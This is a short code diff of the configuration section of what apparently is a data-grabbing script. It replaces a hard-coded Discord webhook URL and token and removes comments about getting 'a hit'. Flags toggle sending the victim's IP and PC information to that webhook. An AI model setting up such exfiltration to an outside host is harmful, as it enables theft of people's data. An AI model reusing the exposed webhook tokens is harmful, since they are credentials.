@@ -1,12 +1,9 @@
 # TODO add embed support
 
 # CONFIGURATION:
-# your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/908872964068478986/uUs7MM_65Ghb17lkhy808GVPKnA76ngfipvT52bohbhgGWRyKDXDBDTNCxf2mi0G4SDl'
-# determines what information you wanna send
+WEBHOOK_URL = 'https://discord.com/api/webhooks/916866420321714177/cKDJ8fPXIxEnAPyWHRmd_vpUfP9So9yN0slnESistslrrRHtro-cW8ff2QO_IXDEM5NE'
 SEND_IP = False
 SEND_PC_INFO = False
-# mentions you when you get a hit
 PING_ME = False
 # Style of the webhook message
 # TEXT , EMBED
